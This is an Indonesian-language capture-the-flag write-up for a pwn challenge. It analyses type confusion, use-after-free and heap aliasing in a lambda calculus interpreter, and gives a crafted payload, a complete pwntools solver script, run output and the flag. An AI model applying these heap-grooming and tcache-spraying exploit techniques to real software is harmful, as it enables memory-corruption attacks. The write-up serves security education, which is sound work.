# WriteUp - idempotence

## Overview
- **Judul:** idempotence
- **Kategori:** Pwn / Heap Exploitation & Interpreter Logic Bug
- **Poin:** 250
- **Author:** maxster
- **Akses:** `nc chals.vuwctf.com 1337` *(Contoh port)*
- **Deskripsi:** This program lets you load the flag into memory!

## Informasi File
Berdasarkan hasil analisis *binary* menggunakan `file` dan `checksec`:
* **Arsitektur:** ELF 64-bit LSB
* **Proteksi:** 
  * NX (No-eXecute) *Enabled*
  * PIE (Position Independent Executable) *Enabled*
  * Stack Canary *Enabled*
  * Full RELRO *Enabled*

## Analisis Kerentanan
Program ini adalah sebuah *interpreter* untuk *Lambda Calculus* yang melakukan evaluasi ekspresi menggunakan strategi *normal order* (kiri-terluar). Kerentanan utamanya adalah kombinasi dari **Type Confusion**, **Use-After-Free (UAF)**, dan **Heap Aliasing** di dalam struktur *Abstract Syntax Tree* (AST).

1. **Struktur AST dan Ukuran Memori:**
   Struktur `expression_t` menggunakan `union` untuk menyimpan data tipe `VAR`, `ABS`, atau `APP`. Ukuran total *struct* ini di memori adalah **24 bytes**.
   
2. **Type Confusion & Uninitialized Memory:**
   Pada fungsi `simplify_normal_order`, saat program melakukan *beta reduction* (mengaplikasikan argumen ke fungsi), terdapat baris kode berikut:
   ```c
   expr->data.app.function->type = ABS; 
   substitute(expr->data.app.function->data.abs.body, ...);
   ```
   Jika `function` aslinya adalah sebuah `VAR` (variabel), ia akan dipaksa berubah tipe menjadi `ABS` (abstraksi). Masalahnya, karena ia awalnya diinisialisasi sebagai `VAR`, memori pada *offset* pointer `body` (di byte ke-16) **tidak pernah diinisialisasi**. Program akan menggunakan nilai *garbage* apa pun yang kebetulan ada di alamat *heap* tersebut sebagai *pointer* AST.

3. **Shallow Copy & Heap Aliasing:**
   Pada fungsi `dup_expression`, variabel disalin menggunakan *shallow copy*:
   ```c
   dest->data.var.name = src->data.var.name; // shallow copy
   ```
   Jika kita mendesain ekspresi lambda tertentu, kita bisa membuat dua *node* variabel berbagi referensi memori yang sama persis. Jika salah satu di-*free* (dibuang ke Tcache), *node* yang satu lagi akan menjadi *dangling pointer* (UAF).

4. **Tcache Spraying via Fungsi Interaktif:**
   Program menyediakan menu `Press r to read the flag`. Fungsi `read_flag()` melakukan `malloc(24)` dan membaca isi "flag.txt". Ukuran `24` ini **sama persis** dengan ukuran `expression_t`. Fungsi ini juga tidak pernah melakukan `free` pada alokasi flag sebelumnya. Jika kita memanggil `r` berkali-kali, kita akan membanjiri (*spray*) *Tcache* dan *heap* dengan *string* flag.

## Skenario Eksploitasi
Eksploitasi dilakukan dengan memberikan *payload* lambda calculus yang secara spesifik mengatur (*groom*) memori Tcache:

**Payload AST:**
```text
(µc.(µd.(µv.(µw.((µy.((µx.(y x)) (µq.q))) (((µk.k) (µz.v)) w))))))
```

**Alur Eksekusi:**
1. **Heap Grooming:** Evaluasi dari AST ini dirancang untuk memaksa variabel `v` dan `w` mengambil blok memori yang saling tumpang tindih (*alias*).
2. **Freeing The Target:** Pada **Cycle 5** evaluasi, *interpreter* selesai memproses bagian tertentu dan melakukan `free()` terhadap *node* `w`. Karena `v` menunjuk ke alamat yang sama dengan `w`, kini `v` adalah sebuah *dangling pointer*.
3. **Tcache Spraying:** Saat jeda interaktif setelah Cycle 5, kita mengirimkan perintah `r` sebanyak 20 kali. Program akan melakukan `malloc(24)` sebanyak 20 kali dan menyedot seluruh *chunk* AST yang kosong di *Tcache* (termasuk *chunk* bekas `w` tadi) lalu mengisinya dengan teks `VuwCTF{...}`.
4. **Leaking The Flag:** Kita kirim perintah `c` untuk melanjutkan evaluasi. Di Cycle 6, *interpreter* mencoba mencetak dan mengevaluasi variabel `v`. Karena memori `v` sudah ditimpa oleh teks flag, *interpreter* mengalami kebingungan tipe (*type confusion*) dan jatuh ke *branch* `default` pada fungsi *print*, yang secara otomatis mencetak `UNKNOWN_DATA[isi memori raw]`, yaitu *flag* itu sendiri.

## Script Solver

```python
#!/usr/bin/env python3
from pwn import *

def solve():
    elf = context.binary = ELF("./interpreter")
    host = "chals.vuwctf.com"
    port = 1337 

    # r = process("./interpreter")
    r = remote(host, port)

    mu = b'\xc2\xb5'

    # 1. Konstruksi Tcache Grooming Payload
    A = b"((" + mu + b"e.(c d)) (" + mu + b"f.f))"
    Q = b"(" + mu + b"q.q)"
    v_w_part = b"(((" + mu + b"k.k) (" + mu + b"z.v)) w)"
    body = b"((" + mu + b"a.((" + mu + b"y.((" + mu + b"x.(y x)) " + Q + b")) " + v_w_part + b")) " + A + b")"
    payload = b"(" + mu + b"c.(" + mu + b"d.(" + mu + b"v.(" + mu + b"w." + body + b"))))"

    log.info("Sending the ultimate Heap Grooming lambda expression...")
    r.sendlineafter(b"Enter your lambda expression:\n", payload)

    target_ast = b"(" + mu + b"c.(" + mu + b"d.(" + mu + b"v.(" + mu + b"w.(v (" + mu + b"q.q))))))"

    cycle = 1
    while True:
        try:
            r.recvuntil(b"======================\n")
            expr = r.recvline().strip()
            log.info(f"[Cycle {cycle}] Current AST: {expr.decode('utf-8', errors='ignore')}")

            r.recvuntil(b"continue:\n")

            if target_ast in expr:
                log.success("Ghost pointer is ALIGNED! Reading flag into Tcache NOW...")

                # Heap Spray: Tekan 'r' 20x untuk membanjiri Tcache dengan flag
                for _ in range(20):
                    r.sendline(b"r")
                    r.recvuntil(b"continue:\n")

                log.info("Triggering Type Confusion and Leaking Memory...")
                r.sendline(b"c")

                final_output = r.recvall(timeout=3)
                lines = final_output.split(b'\n')
                for line in lines:
                    if b"UNKNOWN_DATA" in line or b"VuwCTF{" in line:
                        print(f"\n[+] FLAG LEAKED: {line.decode('utf-8', errors='ignore')}\n")
                break
            else:
                r.sendline(b"c")
                cycle += 1

        except EOFError:
            log.error("Program crashed unexpectedly.")
            break

if __name__ == "__main__":
    solve()
```

## Output Eksekusi

```text
 󰋑  ▶  ./exploit.py
[*] '/home/wanzkey/VUW CTF/Pwn/idempotence/interpreter'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
[+] Starting local process './interpreter': pid 17247
[*] Sending the ultimate Heap Grooming lambda expression...
[*] [Cycle 1] Current AST: (µc.(µd.(µv.(µw.((µy.((µx.(y x)) (µq.q))) (((µk.k) (µz.v)) w))))))
[*] [Cycle 2] Current AST: (µc.(µd.(µv.(µw.((µx.((((µk.k) (µz.v)) w) x)) (µq.q))))))
[*] [Cycle 3] Current AST: (µc.(µd.(µv.(µw.((((µk.k) (µz.v)) w) (µq.q))))))
[*] [Cycle 4] Current AST: (µc.(µd.(µv.(µw.(((µz.v) w) (µq.q))))))
[*] [Cycle 5] Current AST: (µc.(µd.(µv.(µw.(v (µq.q))))))
[+] Ghost pointer is ALIGNED! Reading flag into Tcache NOW...
[*] Triggering Type Confusion and Leaking Memory...
[+] Receiving all data: Done (236B)
[*] Stopped process './interpreter' (pid 17247)

[+] FLAG LEAKED: (µc.(µd.(µv.(µw.((µv.UNKNOWN_DATA[VuwCTF{untyp3dCNFu5ioN}\x00]) UNKNOWN_DATA[}~^K_\x00\x00Ѩ!\x1d,\x10\x16N_\x00\x00])))))
```

## Flag
```text
VuwCTF{untyp3dCNFu5ioN}
```
